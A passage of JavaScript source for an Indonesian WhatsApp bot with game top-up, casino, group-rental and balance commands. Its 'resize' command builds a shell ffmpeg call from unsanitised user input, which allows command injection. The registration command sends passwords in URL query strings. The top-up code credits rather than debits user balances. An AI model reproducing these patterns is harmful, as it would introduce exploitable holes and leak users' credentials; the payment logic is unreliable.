  url: `https://v1.apigames.id/merchant/${global.merchant}/cek-username/mobilelegend?user_id=${idml}&signature=${global.signature}`,
  headers: { }
};

axios(config)
.then(function (response) {
let buttons = [
{ buttonId: prefix+`topupmlyes ${idml1}|${idml2}|${produkid}`, buttonText: { displayText: 'Lanjutkan' }, type: 1 },
]
if (response.data.error_msg) {
reply('Invalid Id Or Zone')
}else if (response.data.message) {
Manik.sendButtonText(m.chat, buttons, `*── 「 CHECK ID OTOMATIS 」 ──*

_Silahkan Cek Data Berikut Ini:_
_》Id Game : ${idml1} (${idml2})_
_》NickName : ${response.data.data.username}_
_》Nama Item : ${produkid} Diamond ( Mlbb )_

Jika Data Sudah Benar Silahkan Klik Lanjutkan Dan Jika Data Salah Silahkan Mengetik Ulang Transaksi Anda!.`, Manik.user.name, m)
} 
})
.catch(function (error) {
  reply(error);
});
}
}
break
case prefix+'topupmlyes':{
if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idml1 = text.split("|")[0]
let idml2 = text.split("|")[1]
let idml =`${idml1}${idml2}`
let produkid = `${text.split("|")[2]}`
let refdi = randomNomor(001, 1000)
let refid = `${refdi}`
let idharga = `UPMBL${produkid}`
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/transaksi/http-get-v1?merchant=${global.merchant}&secret=${global.secret}&produk=${idharga}&tujuan=${idml}&ref=TRX${refid}`,
  headers: { }
};

axios(config)
.then(function (response) {
if (idharga == "UPMBL5"){
global.hargadmml = 1700
}
if (idharga == "UPMBL12"){
global.hargadmml = 4000
}
if (idharga == "ZIDMBL17"){
global.hargadmml = 4500
}
if (idharga == "UPMBL19"){
global.hargadmml = 7000
}
if (idharga == "UPMBL28"){
global.hargadmml = 13000
}
if (idharga == "UPMBL36"){
global.hargadmml = 21000
}
if (idharga == "UPMBL44"){
global.hargadmml = 15000
}
if (idharga == "UPMBL59"){
global.hargadmml = 18500
    }
if (idharga == "UPMBL74"){
global.hargadmml = 22500
    }
if (idharga == "UPMBL85"){
global.hargadmml = 26500
    }
if (idharga == "UPMBL170"){
global.hargadmml = 51500
    }
if (idharga == "UPMBL185"){
global.hargadmml = 56500
    }
if (idharga == "UPMBL222"){
global.hargadmml = 67500
    }
if (idharga == "UPMBL240"){
global.hargadmml = 72500
    }
if (idharga == "UPMBL296"){
global.hargadmml = 89500
    }
if (idharga == "UPMBL370"){
global.hargadmml = 111500
    }
if (idharga == "UPMBL408"){
global.hargadmml = 123500
    }
if (idharga == "UPMBL568"){
global.hargadmml = 167500
    }
if (idharga == "UPMBL875"){
global.hargadmml = 256500
    }
if (idharga == "UPMBL1159"){
global.hargadmml = 333500
    }
if (idharga == "UPMBL2010"){
global.hargadmml = 555.500
    }
if (idharga == "UPMBL4830"){
global.hargadmml = 1322500
    }
let workid = `*── 「 TOPUP SUKSES 」 ──*\n\n_》Harga : Rp${global.hargadmml}_\n_》NickName : ${response.data.data.sn}_\n_》Nama Item : ${produkid} Diamond ( Mlbb )_\n_》Trx Id : ${response.data.data.trx_id}_\n\n_Item Akan Segera Masuk Secara Otomatis Silahkan Melakukan Pengecekan Secara Berkala Pada Game Anda._\n\nNote: Jika Ada Kesalahan Id Atau NickName Bukan Tanggung Jawab Owner!.`
let workd = `*── 「 TOPUP GAGAL 」 ──*

Transaksi Anda Gagal, Saldo Sistem Belum terisi Saldo User Anda Tidak Akan Dipotong, Harap Tumggu Saldo Sistem Reset Setiap 6 Jam Sekali!.`
if(response.data.data.status == "Sukses"){
if (idharga == "UPMBL5"){
moneyAdd(m.sender, 1700)
reply(workid)
}
if (idharga == "UPMBL12"){
moneyAdd(m.sender, 4000)
reply(workid)
}
if (idharga == "ZIDMBL17"){
moneyAdd(m.sender, 4500)
reply(workid)
}
if (idharga == "UPMBL19"){
moneyAdd(m.sender, 7000)
reply(workid)
}
if (idharga == "UPMBL28"){
moneyAdd(m.sender, 10500)
reply(workid)
}
if (idharga == "UPMBL36"){
moneyAdd(m.sender, 13000)
reply(workid)
}
if (idharga == "UPMBL44"){
moneyAdd(m.sender, 15000)
reply(workid)
}
if (idharga == "UPMBL59"){
moneyAdd(m.sender, 18500)
reply(workid)
}
if (idharga == "UPMBL74"){
moneyAdd(m.sender, 22500)
reply(workid)
}
if (idharga == "UPMBL85"){
moneyAdd(m.sender, 26500)
reply(workid)
}
if (idharga == "UPMBL170"){
moneyAdd(m.sender, 51500)
reply(workid)
}
if (idharga == "UPMBL185"){
moneyAdd(m.sender, 56500)
reply(workid)
}
if (idharga == "UPMBL222"){
moneyAdd(m.sender, 67500)
reply(workid)
}
if (idharga == "UPMBL240"){
moneyAdd(m.sender, 72500)
reply(workid)
}
if (idharga == "UPMBL296"){
moneyAdd(m.sender, 89500)
reply(workid)
}
if (idharga == "UPMBL370"){
moneyAdd(m.sender, 111500)
reply(workid)
}
if (idharga == "UPMBL408"){
moneyAdd(m.sender, 123500)
reply(workid)
}
if (idharga == "UPMBL568"){
moneyAdd(m.sender, 167500)
reply(workid)
}
if (idharga == "UPMBL875"){
moneyAdd(m.sender, 256500)
reply(workid)
}
if (idharga == "UPMBL1159"){
moneyAdd(m.sender, 333500)
reply(workid)
}
if (idharga == "UPMBL2010"){
moneyAdd(m.sender, 555.500)
reply(workid)
}
if (idharga == "UPMBL4830"){
moneyAdd(m.sender, 1322500)
reply(workid)
}
} else if(response.data.data.status == "Gagal"){
reply(workd)
}
})
break
}
case prefix+'topupml2':{
if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idml1 = text.split("|")[0]
let idml2 = text.split("|")[1]
let idml = `${idml1}${idml2}`
let produkid = text.split("|")[2]
if (isNaN(parseInt(produkid))) return reply('Jumlah Harus Berupa Angka!')
if (isNaN(parseInt(idml1))) return reply('Id Harus Berupa Angka!')
if (isNaN(parseInt(idml2))) return reply('Server Harus Berupa Angka!')
let idharga = `ZIDMBL${produkid}`
if (idharga == "ZIDMBL17"){
global.hargadmml = 4500
}
if (idharga == "ZIDMBL34"){
global.hargadmml = 9000
}
if (idharga == "ZIDMBL50"){
global.hargadmml = 13500
}
if (idharga == "ZIDMBL66"){
global.hargadmml = 18000
}
if (idharga == "ZIDMBL74"){
global.hargadmml = 20000
}
if (idharga == "ZIDMBL83"){
global.hargadmml = 22500
    }
if (idharga == "ZIDMBL184"){
global.hargadmml = 50000
    }
if (idharga == "ZIDMBL366"){
global.hargadmml = 100000
    }
if (idharga == "ZIDMBL758"){
global.hargadmml = 200000
    }
if (getMonUser(sender) < global.hargadmml) {
 reply('Saldo User Anda Kurang!. Silahkan Melakukan Deposit Terlebih Dahulu')
 } else if(getMonUser(sender) > global.hargadmml) {
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/merchant/${global.merchant}/cek-username/mobilelegend?user_id=${idml}&signature=${global.signature}`,
  headers: { }
};

axios(config)
.then(function (response) {
let buttons = [
{ buttonId: prefix+`topupml2yes ${idml1}|${idml2}|${produkid}`, buttonText: { displayText: 'Lanjutkan' }, type: 1 },
]
if (response.data.error_msg) {
reply('Invalid Id Or Zone')
}else if (response.data.message) {
Manik.sendButtonText(m.chat, buttons, `*── 「 CHECK ID OTOMATIS 」 ──*

_Silahkan Cek Data Berikut Ini:_
_》Id Game : ${idml1} (${idml2})_
_》NickName : ${response.data.data.username}_
_》Nama Item : ${produkid} Diamond ( Mlbb )_

Jika Data Sudah Benar Silahkan Klik Lanjutkan Dan Jika Data Salah Silahkan Mengetik Ulang Transaksi Anda!.`, Manik.user.name, m)
} 
})
.catch(function (error) {
  reply(error);
});
}
}
break
case prefix+'topupml2yes':{
if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idml1 = text.split("|")[0]
let idml2 = text.split("|")[1]
let idml =`${idml1}${idml2}`
let produkid = `${text.split("|")[2]}`
let refdi = randomNomor(001, 1000)
let refid = `${refdi}`
let idharga = `ZIDMBL${produkid}`
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/transaksi/http-get-v1?merchant=${global.merchant}&secret=${global.secret}&produk=${idharga}&tujuan=${idml}&ref=TRX${refid}`,
  headers: { }
};

axios(config)
.then(function (response) {
if (idharga == "ZIDMBL17"){
global.hargadmml = 4500
}
if (idharga == "ZIDMBL34"){
global.hargadmml = 9000
}
if (idharga == "ZIDMBL50"){
global.hargadmml = 13500
}
if (idharga == "ZIDMBL66"){
global.hargadmml = 18000
}
if (idharga == "ZIDMBL74"){
global.hargadmml = 20000
}
if (idharga == "ZIDMBL83"){
global.hargadmml = 22500
    }
if (idharga == "ZIDMBL184"){
global.hargadmml = 50000
    }
if (idharga == "ZIDMBL366"){
global.hargadmml = 100000
    }
if (idharga == "ZIDMBL758"){
global.hargadmml = 200000
    }
let workid = `*── 「 TOPUP SUKSES 」 ──*\n\n_》Harga : Rp${global.hargadmml}_\n_》NickName : ${response.data.data.sn}_\n_》Nama Item : ${produkid} Diamond ( Mlbb )_\n_》Trx Id : ${response.data.data.trx_id}_\n\n_Item Akan Segera Masuk Secara Otomatis Silahkan Melakukan Pengecekan Secara Berkala Pada Game Anda._\n\nNote: Jika Ada Kesalahan Id Atau NickName Bukan Tanggung Jawab Owner!.`
let workd = `*── 「 TOPUP GAGAL 」 ──*

Transaksi Anda Gagal, Saldo Sistem Belum terisi Saldo User Anda Tidak Akan Dipotong, Harap Tumggu Saldo Sistem Reset Setiap 6 Jam Sekali!.`
if(response.data.data.status == "Sukses"){
if (idharga == "ZIDMBL17"){
moneyAdd(m.sender, 4500)
reply(workid)
}
if (idharga == "ZIDMBL34"){
moneyAdd(m.sender, 9000)
reply(workid)
}
if (idharga == "ZIDMBL50"){
moneyAdd(m.sender, 13500)
reply(workid)
}
if (idharga == "ZIDMBL66"){
moneyAdd(m.sender, 18000)
reply(workid)
}
if (idharga == "ZIDMBL74"){
moneyAdd(m.sender, 20000)
reply(workid)
}
if (idharga == "ZIDMBL83"){
moneyAdd(m.sender, 22500)
reply(workid)
}
if (idharga == "ZIDMBL184"){
moneyAdd(m.sender, 50000)
reply(workid)
}
if (idharga == "ZIDMBL366"){
moneyAdd(m.sender, 100000)
reply(workid)
}
if (idharga == "ZIDMBL758"){
moneyAdd(m.sender, 200000)
reply(workid)
}
} else if(response.data.data.status == "Gagal"){
reply(workd)
}
})
break
}
//━━━━━━━━━━━━━━━[ Fitur topup Otomatis server 1 Case Dan Fitur By Manik Only! ]━━━━━━━━━━━━━━━\\


//━━━━━━━━━━━━━━━[ Fitur topup Otomatis server Dunia Games Case By Manik Only! ]━━━━━━━━━━━━━━━\\
case prefix+'listdmff2':
let topupp = `*── 「 DIAMOND FREE FIRE 」 ──*

_》5 Diamond : Rp1.261_
_》12 Diamond : Rp2.523_
_》70 Diamond : Rp12.614_
_》140 Diamond : Rp25.227_
_》355 Diamond : Rp63.068_
_》720 Diamond : Rp126.136_
_》1450 Diamond : Rp252.273_

Cara Pembelian:
${prefix}topupff2 ID|JUMLAH DIAMOND
Contoh:
${prefix}topupff2 123456789|1450

NOTE: Pembelian Akan Diproses Oleh Sistem Otomatis Ketika Anda Telah Melakukan Pembayaran Dan Diamond Akan Segera Masuk.
`
reply(topupp)
break

case prefix+'topupff2':{
let idff = text.split("|")[0]
let totaldm = text.split("|")[1]
let nopemu = sender.replace("@s.whatsapp.net", "")
var baseURL = "https://duniagames.co.id";
var axios = require('axios');
axios.get(`https://api.lolhuman.xyz/api/freefire/${idff}?apikey=${lolkey}`)
            .then(({data}) => {
reply('Tunggu Sebentar Kak, ManikBot Akan Cek Id Kakak')
            })
            .catch((err) => {
                reply('Id Atau NickName Tidak Ditemukan!')
            })
const topup = async(userId, zoneId, diamond, phone, game) => {
  if (!userId || !diamond || !phone || !game) return new Error();
  let cookie = await getCookie(baseURL);
  if (!cookie) return new Error("empty cookies");
  let res = await axios.post(`https://api.duniagames.co.id/api/transaction/v1/top-up/inquiry/store?${getVal(diamond, game.toUpperCase())}&gameId=${userId}&product_ref=REG&product_ref_denom=AE`, null, {
    "headers": { 
      "cookie": cookie.join(" "),
      "origin": baseURL,
      "referer": baseURL
    }
  })
  if (res.status != 200) throw new Error(res.statusText);
  let res2 = await axios.post(`https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/store?inquiryId=${res.data.data.inquiryId}&phoneNumber=${phone}&transactionId=${res.data.data.transactionId}`, null, {
    "headers": { 
      "cookie": cookie.join(" "),
      "origin": baseURL,
      "referer": baseURL
    }
  })
if (res2.status != 200) throw new Error(res2.statusText);
let suksess = `*── 「 TOPUP OTOMATIS 」 ──*
                
_Silahkan Scan Qris Dan Transfer Sesuai Harga:_
_》Harga : Rp${res2.data.data.totalPrice}_
_》NickName : ${res2.data.data.userGameName}_
_》Nama Item : ${res.data.data.item.name} ( FreeFire )_
_》Code Trx : ${res2.data.data.transactionCode}_

_Qr Scan Berlaku 5 Menit, Setelah 5 Menit Pesan Ini Akan Dihapus!._  

_Note: Diamond Akan Otomatis Masuk Dalam 2-3 Menit Setelah Pembayaran Berhasil._`
let kirimk = await Manik.sendMessage(m.chat, { image: { url: res2.data.data.elisaConfig.qrCode }, caption: `${suksess}` }, { quoted: m })
setTimeout(() => {
Manik.sendMessage(from, { delete:kirimk.key })
}, 500000)
}
const getCookie = async(...args) => (await axios(...args)).headers["set-cookie"];
function getVal(dm, game) {
  let list = JSON.parse(fs.readFileSync("./duniagames.json"));
  if (!list[game]) return new Error("no game for '" + game + "'");
  return new URLSearchParams(list[game][dm]).toString();
}
let shop = await topup(`${idff}`, null, `${totaldm}`, `${nopemu}`, "freefire")
break
}
//━━━━━━━━━━━━━━━[ Fitur topup Otomatis server Dunia Games Case By Manik Only! ]━━━━━━━━━━━━━━━\\

case prefix+'say':
let idfc = args[1]
reply(idfc)
break
case 'modesimi':
          if (args.length < 1) return reply('1/0')
          if (Number(args[1]) === 1) {
          simin.push(from)
          fs.writeFileSync('./database/simi.json', JSON.stringify(simin))
          reply('Sukses mengaktifkan mode simi')
          } else if (Number(args[1]) === 0) {
          simin.splice(from, 1)
          fs.writeFileSync('./database/simi.json', JSON.stringify(simin))
          reply('Sukes menonaktifkan mode simi')
          } else {
          reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
          }
          break
case 'anone':{
let idml1 = text.split("|")[0]
let idml2 = text.split("|")[1]
let idml =`${idml1}${idml2}`
let produkid = text.split("|")[2]
let refdi = randomNomor(001, 1000)
let refid = `${refdi}`
reply(`https://v1.apigames.id/merchant/${global.merchant}/cek-username/mobilelegend?user_id=${idml}&signature=${global.signature}`)
break
}
//FITUR WITH TRENDTODAY BY MANIK DENGAN DISTRIBUTOR RAFLI RUSDIANA
case prefix+'myotp':
if (isGroup) return reply(mess.OnlyPM)
let senotp = sender.replace("@s.whatsapp.net", "")
let ininyaa = await fetchJson(`https://trendtoday.my.id/api/register?phone=${senotp}`)
if (ininyaa.status == 500){
reply('Server Error')
} else if (ininyaa.status == 200){
reply(ininyaa.message)
}
break
case prefix+'verification':
if (isGroup) return reply(mess.OnlyPM)
let versen = sender.replace("@s.whatsapp.net", "")
if (args.length == 1) return reply('Masukan Otp Nya!')
if (args[1].includes('+')) return reply(`Jangan menggunakan +`)
if (isNaN(parseInt(args[1]))) return reply('Otp Harus Berupa Angka!')
let statusnya = await fetchJson(`https://trendtoday.my.id/api/phone-verify?phone=${versen}&otp=${args[1]}`)
if (statusnya.status == 500){
reply('Server Error')
} else if (statusnya.status == 200){
reply(statusnya.message)
}
break
case prefix+'registration':
if (!q.includes("|")) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama|Email|Password*\n\n_Contoh_\n\n${command.slice(1)} Arya|aryamanik000@gmail.com|aryamanik00`)
let trenpon = sender.replace("@s.whatsapp.net", "")
let trennma = text.split("|")[0]
let trenmail = text.split("|")[1]
let trenpew = text.split("|")[2]
let linkttd = await fetchJson(`http://trendtoday.my.id/api/complete-data?phone=${trenpon}&name=${trennma}&username=${pushname}&email=${trenmail}&password=${trenpew}`)
reply(linkttd.message)
break
//FITUR WITH TRENDTODAY BY MANIK DENGAN DISTRIBUTOR RAFLI RUSDIANA
		case prefix+'casino':
                 if (!isGroup)return reply(mess.OnlyGrup)
                 if (isGame(sender, isManik, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                 if (args.length < 2) return reply(`Kirim perintah *${command}* @tag nominal`)
                 if (mentionUser.length == 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
                 if (mentionUser.length > 2) return reply('Hanya bisa dengan 1 orang')
                 if (mentionUser[0] === sender) return reply(`Sad amat main sama diri sendiri`)
				 if (mentionUser[0] === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
                 if (fs.existsSync(`./database/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delcasino*, untuk menghapus sesi`)
                 if (args.length == 2) return reply('Masukan Nominal Nya')
                 if (args[2].includes('-')) return reply(`Jangan menggunakan -`)
                 if (isNaN(parseInt(args[2]))) return reply('Nominal Harus Berupa Angka!')
                 var anu = getBalance(sender, balance)
                 var ani = getBalance(mentionUser[0], balance)
                 if (anu < args[2] || anu == 'undefined') return reply(`Balance Tidak Mencukupi, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
                 if (ani < args[2] || ani == 'undefined') return reply(`Balance Lawan Tidak Mencukupi Untuk Bermain Denganmu\nKetik ${prefix}balance @tag untuk mengecek Balance lawanmu`)
                 var casinoo = setCasino(`${from}`)
                 casinoo.Z = sender.replace("@s.whatsapp.net", "")
                 casinoo.Y = mentionUser[0].split("@")[0]
                 casinoo.nominal = parseInt(args[2])
                 addCountCmd('#casino', sender, _cmd)
                 fs.writeFileSync(`./database/${from}.json`, JSON.stringify(casinoo, null, 2))
                 gameAdd(sender, glimit)
                 var starGame = `🎰 Memulai Game Casino 💰\n\n• @${sender.replace("@s.whatsapp.net", "")} Menantang ${args[1]}, dengan Nominal: *$ ${parseInt(args[2])}*\n• Ketik Y/N untuk menerima atau menolak Permainan!`
                 Manik.sendMessage(from, { text: starGame, mentions: [sender, args[1].replace("@", "") + "@s.whatsapp.net"] }, { quoted: m })
                 break
            case prefix+'delcasino':
                 if (fs.existsSync('./database/'+from+'.json')) {
                 var csn = JSON.parse(fs.readFileSync('./database/'+from+'.json'))
		 if (csn.Z.includes(sender)) {
		   addCountCmd('#delcasino', sender, _cmd)
		   deleteCasino(from)
                   reply('Berhasil Menghapus Sesi Casino')
		 } else if (csn.Y.includes(sender)) {
		   addCountCmd('#delcasino', sender, _cmd)
		   deleteCasino(from)
		   reply('Berhasil Menghapus Sesi Casino')
		 } else if (isAdmins) {
		   addCountCmd('#delcasino', sender, _cmd)
		   deleteCasino(from)
		   reply('Berhasil Menghapus Sesi Casino')
		 } else if (isManik) {
		   addCountCmd('#delcasino', sender, _cmd)
		   deleteCasino(from)
		   reply('Berhasil Menghapu Sesi Casino')
		 } else {
	           reply('Anda tidak bisa menghapus sesi casino, karena bukan pemain!')
		 }
                 } else {
                  reply('Tidak ada sesi yang berlangsung')
                 }
                 break
				 
				 
//SEWA

       case prefix+'sewa': 
       addCountCmd(`#${command.slice(1)}`, sender, _cmd)
			if (!isManik || m.key.fromMe) return reply(mess.only.owner)
			if (args[1] === 'add') {
				var xx = 86400000 * args[3]
				var linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
				var [_, code] = args[2].match(linkRegex) || []
				var own = owner[0]
				if (!code) return reply(`Link Group Tidak Valid !`)
				if (!args[2]) return reply(`Link Group Belum Di input!?`)
				if (!args[3]) return reply(`Masa Aktif Sewa Belum Di input !?`)
				if (isNaN(args[3])) return reply(`Hanya angka, mewakili hari!`)
				m.reply(`Tunggu 3 detik bot akan join`)
				var resa = await Manik.groupAcceptInvite(code)
				var asu = await Manik.groupGetInviteInfo(code)
				premium.addPremiumUser(`${asu.id}`, args[2], `${asu.subject}`, `${asu.owner}`, `${xx}`, _premium)
				await m.reply(`Sukses invite bot ke group\n\n\n${asu.subject}\nBot akan keluar secara otomatis setelah ${ms(toMs(`${xx}`)).days} Hari ${ms(toMs(`${xx}`)).hours} Jam ${ms(toMs(`${xx}`)).minutes} Menit`)
				await Manik.sendMessage(`${asu.id}`, { text: `Sukses invite bot ke group\n\n${asu.subject}\n\nBot akan keluar secara otomatis setelah ${ms(toMs(`${xx}`)).days} Hari ${ms(toMs(`${xx}`)).hours} Jam ${ms(toMs(`${xx}`)).minutes} Menit`}, {mentions: [m.sender]})
          }
			  
			  else if (args[1] === 'del') {
			_premium.splice(premium.getPremiumPosition(args[2], _premium), 1)
              fs.writeFileSync('./database/premium.json', JSON.stringify(_premium))
				await Manik.sendMessage(args[2], { text: `BOT Sebentar lagi keluar!`})
				let n = await Manik.groupMetadata(args[2])
				await Manik.groupLeave(args[2])
				await Manik.sendMessage(owner[0]+'@s.whatsapp.net', { text: `BOT Sebentar lagi keluar!`})
}
               else {
              reply(mess.wrongFormat)
}
              break
			  
			  
       case prefix+'ceksewa': 
       addCountCmd(`#${command.slice(1)}`, sender, _cmd) 
              if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
              const cekExp = ms(await premium.getPremiumExpired(m.chat, _premium) - Date.now())
              reply(`*「 SEWA EXPIRE 」*\n\n➸ *ID*: ${m.chat}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
              break
			  
		case prefix+'listsewa':
		addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (_premium.length === 0) return reply(`Belum ada list sewa di database`)
			var arr_rows = [];
            for (let i of _premium) {
				const checkExp = ms(i.expired - Date.now())
                arr_rows.push({
                        title: i.name,
                        rowId: `.sewa del ${i.id}`,
						description: `EXPIRED : ${checkExp.days} Hari ${checkExp.hours} Jam ${checkExp.minutes} Menit`
						
                    })
                
            }
		const listMessage12 = {
		  text: `Berikut List Sewa\nYang Terdaftar Di DATABASE`,
		  footer: "\nPilih Untuk Keluar !",
		  buttonText: "Lihat Daftar!",
		  sections: [{
							title: 'Nama Grup | Expired', rows: arr_rows
						}],
						listType: 1
		}

		await Manik.sendMessage(m.chat, listMessage12)
					//////////////
					
				break
			  
			  
                case prefix+'limit': case prefix+'balance':
			case prefix+'ceklimit': case prefix+'cekbalance':
			addCountCmd(`#${command.slice(1)}`, sender, _cmd) 
                    var limitPrib = global.db.users[m.sender].limit
                    reply(`Name: ${pushname}\nLimit : ${isPremium ? 'Unlimited' : limitPrib}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(m.sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
				break
	    case prefix+'family100':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd) 
	if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
gameAdd(sender, glimit)
                if ('family100'+m.chat in _family100) {
                    reply('There are still unfinished sessions!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Answer the following questions :*\n${random.soal}\n\nThere is *${random.jawaban.length}* Answer ${random.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await Manik.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
			
			
case 'resize':
if (/image/.test(mime)) {
if(!q) return reply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
 let media = await quoted.download()
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await Manik.sendMessage(from, {mimetype: 'image/jpeg', image: buffer453, caption: `Nih ${q}`}, { quoted: m })
fs.unlinkSync(ran)
})
} else {
reply("Reply Imagenya")
}
break

//RESTART
case prefix+'restart':
/*if (!isManik) return reply('owner')
await reply(`_Restarting ${botName}_`)
try{
await Manik.sendMessage(from, {text: "_Succes_"})
await sleep(3000)
exec(`node index.js`)
} catch (err) {
exec(`node index`)
await sleep(4000)
reply('Sukses')
}*/
let { spawn } = require('child_process');
  if (!process.send) throw 'Dont: node main.js\nDo: node index.js'
  await m.reply('Sedang Merestart Bot...\nMohon tunggu sekitar 1 menit')
    process.send('reset')
break


case 'whatanime':{
const FormData = require('form-data')
if (isImage || isQuotedImage) {       
let yoooo = await Manik.downloadAndSaveMediaMessage(quoted)
let bodyForm = new FormData();
bodyForm.append('image', fs.createReadStream(yoooo)) 
fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
.then(async(res) =>{
if (res.result && res.result.length <= 0) return reply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await Manik.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: ridho})
})    .catch((err) => {                   
reply(mess.error.api)
})
} else if (isSticker || isQuotedSticker ) {
let yoooo = await Manik.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return reply('Gagal :V')   
let bodyForm = new FormData();
bodyForm.append('image', fs.createReadStream(ran)) 
fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
.then(async(res) =>{
if (res.result && res.result.length <= 0) return reply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await Manik.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: ridho})
fs.unlinkSync(ran)
})
.catch((err) => {       
reply(mess.error.api)
})
})
} else {
reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
}
}
break
            //Bank & Payment Menu
			case prefix+'topbalance':{
			    addCountCmd('#topbalance', sender, _cmd)
                balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
                let top = '*── 「 TOP BALANCE 」 ──*\n\n'
                let arrTop = []
				var total = 10
				if (balance.length < 10) total = balance.length
                for (let i = 0; i < total; i ++){
                    top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
                    arrTop.push(balance[i].id)
                }
                mentions(top, arrTop, true)
            }
                break
            case prefix+'buylimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $150 balance`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                let ane = Number(parseInt(args[1]) * 150)
                if (getMoney(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                addCountCmd('#buylimit', sender, _cmd)
                kurangBalance(sender, ane, balance)
                giveLimit(sender, parseInt(args[1]), limit)
                reply(monospace(`Pembeliaan limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
            }
                break
			case prefix+'transfer':
            case prefix+'tf':{
                 if (args.length < 2) return reply(`Kirim perintah *${command}* @tag nominal\nContoh : ${command} @0 2000`)
                 if (mentionUser.length == 0) return reply(`Tag orang yang ingin di transfer balance`)
                 if (!args[2]) return reply(`Masukkan nominal nya!`)
                 if (isNaN(args[2])) return reply(`Nominal harus berupa angka!`)
                 if (args[2].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                 if (args[2].includes("-")) return reply(`Jangan menggunakan -`)
                 var anu = getBalance(sender, balance)
                 if (anu < args[2] || anu == 'undefined') return reply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${args[2]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
                 addCountCmd('#transfer', sender, _cmd)
                 kurangBalance(sender, parseInt(args[2]), balance)
                 addBalance(mentionUser[0], parseInt(args[2]), balance)
                 mentions(`Sukses transfer balance sebesar $${args[2]} kepada @${mentionUser[0].split("@")[0]}`, [mentionUser[0]], true)
            }
                 break
            case prefix+'buygamelimit':
            case prefix+'buyglimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buyglimit* jumlah game limit yang ingin dibeli\n\nHarga 1 game limit = $150 balance\nPajak $1 / $10`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                let ane = Number(parseInt(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                addCountCmd('#buygamelimit', sender, _cmd)
                kurangBalance(sender, ane, balance)
                givegame(sender, parseInt(args[1]), glimit)
